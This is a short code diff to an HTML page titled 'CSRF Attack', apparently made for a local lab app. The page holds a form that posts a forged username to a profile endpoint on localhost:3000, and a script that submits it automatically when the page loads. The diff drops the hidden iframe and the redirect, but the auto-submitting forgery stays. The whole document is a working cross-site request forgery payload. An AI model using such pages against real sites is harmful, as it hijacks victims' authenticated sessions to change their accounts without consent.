@@ -4,16 +4,12 @@
     <title>CSRF Attack</title>
 </head>
 <body>
-    <form id="csrfForm" action="http://localhost:3000/profile" method="POST" target="hidden_iframe">
+    <form action="http://localhost:3000/profile" method="POST">
         <input type="text" name="username" value="CSRF Attack">
-        <input type="submit" style="display: none;">
+        <input type="submit">
     </form>
-    <iframe name="hidden_iframe" style="display: none;"></iframe>
     <script>
-        document.forms['csrfForm'].submit();
-        setTimeout(function() {
-            window.location.href = 'http://localhost:3000/#/review';  
-        }, 1000);
+        document.forms[0].submit();
     </script>
 </body>
 </html>
